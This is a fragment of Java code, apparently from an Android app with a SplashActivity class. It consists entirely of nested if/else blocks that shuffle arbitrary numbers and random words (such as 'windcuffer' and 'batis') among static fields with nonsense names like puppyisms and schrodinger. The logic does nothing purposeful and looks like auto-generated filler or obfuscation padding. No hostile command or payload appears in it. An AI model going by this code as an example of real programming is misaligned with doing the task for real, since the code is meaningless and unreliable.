 {        if ( SplashActivity.puppyisms == null
) {
                    kYMBz = "windcuffer" ;

            } else {
                    SplashActivity.pipsissewas = "";
}



}        if (14 <= SplashActivity.schrodinger
) {
                    if ( kYMBz != null) {
                    if (SplashActivity.blimp <= 4

) {
            
 if ( SplashActivity.klondykes == null
) 
 {        SplashActivity.etherizers = true;
}
 else if 
 ( SplashActivity.puppyisms == null
) 
 {        SplashActivity.haircutter = 12;

} 
 else 
 {        SplashActivity.blimp -= 11;

}
                     kYMBz = "";

                      kYMBz = "batis" ;
}

             
 if (10 <= SplashActivity.blimp
) 
 {        pnLQ5 =  true;
}
 else if 
 ( trt6m 
) 
 {        SplashActivity.blimp = 13;
} 
 else 
 {        trt6m = false;
}
                      SplashActivity.blimp = 10;

}

            } else {
                    if ( pnLQ5 
) {
                    if (SplashActivity.haircutter <= SplashActivity.blimp

) {
                    kYMBz = "Neron" ;

            } else {
                    pnLQ5 =  true;
}




                     pnLQ5 = false;

                      SplashActivity.schrodinger -= 9;

}
}




         
    }

     }


